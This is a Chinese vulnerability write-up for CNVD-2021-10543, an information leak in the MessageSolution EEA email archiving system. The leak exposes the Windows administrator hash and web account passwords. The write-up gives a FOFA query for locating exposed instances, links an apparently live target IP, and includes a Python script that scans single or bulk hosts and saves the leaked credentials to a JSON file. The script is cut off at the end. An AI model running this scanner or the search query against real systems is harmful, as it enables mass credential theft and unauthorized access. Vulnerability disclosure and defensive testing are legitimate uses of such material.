## 漏洞概述

MessageSolution企业邮件归档管理系统
EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator
hash与web账号密码

## 影响范围

MessageSolution 企业邮件归档管理系统EEA

## 复现过程

### fofa

    
    
    title="MessageSolution Enterprise Email Archiving (EEA)"

  

![](https://image.3001.net/images/20210323/1616509235_6059f9331145746f36450.png!small)  

  

漏洞URL：

[http://ip/authenticationserverservlet/](http://41.193.41.242:7777/authenticationserverservlet/)

![](https://image.3001.net/images/20210323/1616509269_6059f9559df9ce3517049.png!small)![](https://image.3001.net/images/20210323/1616509312_6059f9802e8e0fad5d84c.png!small)  

  

![](https://image.3001.net/images/20210323/1616509664_6059fae0bf35748cb4fe7.png!small)  

使用获得到的密码可以登录系统

![](https://image.3001.net/images/20210323/1616509556_6059fa7471f036099c796.png!small)  

  

## POC

环境：python3.8+

运行方式：python3 main.py --help

支持单个或批量~

    
    
    #!/usr/bin/python
    # coding: UTF-8
    import argparse
    import asyncio
    import json
    import pathlib
    from typing import Tuple
    from urllib.parse import urlparse
    
    
    import httpx
    
    
    CVE_ID = "CNVD-2021-10543"
    
    
    class URLAction(argparse.Action):
        def __call__(self, parser, namespace, values, option_string=None):
            if not urlparse(values):
                raise ValueError("Not a valid url!")
            setattr(namespace, self.dest, values)
    
    
    class FILEAction(argparse.Action):
        def __call__(self, parser, namespace, values, option_string=None):
            if not pathlib.Path(values).exists():
                raise ValueError("File not exists!")
            setattr(namespace, self.dest, values)
    
    
    parser = argparse.ArgumentParser(description=f"{CVE_ID} Poc")
    parser.add_argument("--host", type=str, action=URLAction, help="target host uri")
    parser.add_argument("--file", type=str, action=FILEAction, help="target host file")
    parser.add_argument("--conn", type=int, default=10, help="asyncio max connetions")
    args = parser.parse_args()
    
    
    SEM = asyncio.Semaphore(args.conn)
    RESULT = {}
    
    
    async def check(host: str) -> Tuple[str, bool]:
        status = False
        async with SEM:
            async with httpx.AsyncClient(
                base_url=host,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                },
            ) as client:
                try:
                    resp = await client.get(
                        "/authenticationserverservlet/",  timeout=5
                    )
                    if resp.status_code == 200 and "administrator" in resp.text:
                        status = resp.text
                except Exception as e:
                    status = str(e)
                finally:
                    RESULT[host] = status
                    return host, status
    
    
    async def loop(urls):
        await asyncio.gather(*list(map(check, urls)))
    
    
    def main():
        result_file = pathlib.Path(f"{CVE_ID}.json")
        try:
            urls = set()
            if args.host:
                urls.add(args.host)
            if args.file:
                with pathlib.Path(args.file).open("r") as file:
                    urls = urls.union(
                        {url for line in file if urlparse((url := line.strip()))}
                    )
            print(f"tasks: {len(urls)}")
            asyncio.run(loop(urls))
        except KeyboardInterrupt:
            pass
        finally:
            with result_file.open("w") as file:
                file.write(json.dumps(RESULT, indent=4, ensure_ascii=True))
    
    
    if __name__ == "__main__":
     

输出结果：

  

![](https://image.3001.net/images/20210323/1616509768_6059fb489689fe6084b1f.png!small)  

  

## Reference

https://mp.weixin.qq.com/s/_ieRHX-7nnnWMeflFcNEnQ﻿

